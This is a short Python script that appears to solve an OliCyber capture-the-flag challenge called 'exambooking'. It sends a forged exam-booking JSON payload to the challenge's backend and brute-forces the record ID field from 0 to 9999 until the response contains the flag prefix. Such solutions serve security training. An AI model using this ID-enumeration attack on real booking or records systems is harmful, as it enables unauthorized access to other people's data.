import requests, json

url = "http://exambooking.challs.olicyber.it/bakand"

payload = {
    "id_verbale":0,
    "cod_ins":"01ELEET",
    "d_ini_appel":"",
    "d_fin_appel":"",
    "data_appello":"2021-07-05",
    "frequenza":2021,
    "nome_insegnamento":"Hacktivism",
    "docente":"ROBOT MR",
    "data_ora_appello":"05-07-2021 17:00",
    "desc_tipo":"Esami scritti a risposta aperta o chiusa tramite PC",
    "note":"Connect to the Lockdown Browser at 8:30.   The written exam will be held on September 14, at 3p.m.",
    "mat_docente":"30120",
    "aula":" ",
    "posti_liberi":999
}

for i in range(10000):
    payload['id_verbale'] = i
    res = requests.post(url, headers={'Content-Type':'application/json'}, data=json.dumps(payload))
    if 'ptm' in res.text:
        print(res.text)
        break